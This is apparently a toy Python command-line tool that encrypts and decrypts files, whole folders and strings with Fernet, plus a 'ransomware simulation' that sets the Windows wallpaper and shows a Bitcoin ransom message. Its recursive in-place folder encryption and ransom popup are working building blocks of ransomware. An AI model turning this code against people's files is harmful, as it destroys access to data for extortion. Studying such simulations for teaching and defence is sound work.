#!/usr/bin/env python3

import os
import ctypes
from cryptography.fernet import Fernet, InvalidToken

# Check if tkinter is available
try:
    import tkinter as tk
    from tkinter import messagebox
    tkinter_available = True
except ModuleNotFoundError:
    print("tkinter module not found. Ransomware simulation feature will be disabled.")
    tkinter_available = False

# Function to generate and save a new encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Function to load the existing encryption key
def load_key():
    with open("encryption_key.key", "rb") as key_file:
        return key_file.read()

# Function to encrypt a file using the provided key
def encrypt_file(filepath, key):
    fernet = Fernet(key)
    with open(filepath, "rb") as file:
        encrypted_data = fernet.encrypt(file.read())
    with open(filepath, "wb") as file:
        file.write(encrypted_data)

# Function to decrypt a file using the provided key
def decrypt_file(filepath, key):
    fernet = Fernet(key)
    with open(filepath, "rb") as file:
        decrypted_data = fernet.decrypt(file.read())
    with open(filepath, "wb") as file:
        file.write(decrypted_data)

# Function to encrypt a string
def encrypt_string(text, key):
    return Fernet(key).encrypt(text.encode()).decode()

# Function to decrypt a string with error handling
def decrypt_string(text, key):
    try:
        return Fernet(key).decrypt(text.encode()).decode()
    except InvalidToken:
        return "Decryption failed: Invalid token. Check if the message is correct and the correct key is used."

# Function to change the desktop wallpaper
def change_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

# Function to create a popup window with a ransomware message
def show_ransomware_popup(message):
    if tkinter_available:
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning("Ransomware Alert", message)
        root.destroy()
    else:
        print("Ransomware message: ", message)

# Function to simulate a ransomware attack
def ransomware_simulation():
    wallpaper_image_path = "path_to_ransomware_wallpaper.jpg"
    ransomware_message = "Your files have been encrypted! To decrypt them, send 1 Bitcoin to..."
    change_wallpaper(wallpaper_image_path)
    show_ransomware_popup(ransomware_message)

# Function to recursively encrypt a folder
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Function to recursively decrypt a folder
def decrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

# Main function to handle user input and perform actions
def main():
    if not os.path.exists("encryption_key.key"):
        generate_key()
    key = load_key()

    print("Debug: Key (first 10 chars):", key[:10])

    while True:
        print("1. Encrypt a file\n2. Decrypt a file\n3. Encrypt a message\n4. Decrypt a message\n5. Ransomware Simulation (disabled if tkinter not installed)\n6. Encrypt a folder\n7. Decrypt a folder\n8. Exit")
        mode = input("Enter the mode (1/2/3/4/5/6/7/8): ")

        if mode == '1':
            filepath = input("Enter file path to encrypt: ")
            encrypt_file(filepath, key)
            print("File encrypted successfully.")
        elif mode == '2':
            filepath = input("Enter file path to decrypt: ")
            decrypt_file(filepath, key)
            print("File decrypted successfully.")
        elif mode == '3':
            text = input("Enter message to encrypt: ")
            print("Encrypted message:", encrypt_string(text, key))
        elif mode == '4':
            text = input("Enter encrypted message: ")
            decrypted_message = decrypt_string(text, key)
            print("Decrypted message:", decrypted_message)
        elif mode == '5' and tkinter_available:
            ransomware_simulation()
            print("Ransomware simulation executed.")
        elif mode == '6':
            folder_path = input("Enter folder path to encrypt: ")
            encrypt_folder(folder_path, key)
            print("Folder encrypted successfully.")
        elif mode == '7':
            folder_path = input("Enter folder path to decrypt: ")
            decrypt_folder(folder_path, key)
            print("Folder decrypted successfully.")
        elif mode == '8':
            print("Goodbye!")
            break
        else:
            print("Invalid mode. Please choose 1, 2, 3, 4, 5, 6, 7, or 8.")

if __name__ == "__main__":
    main()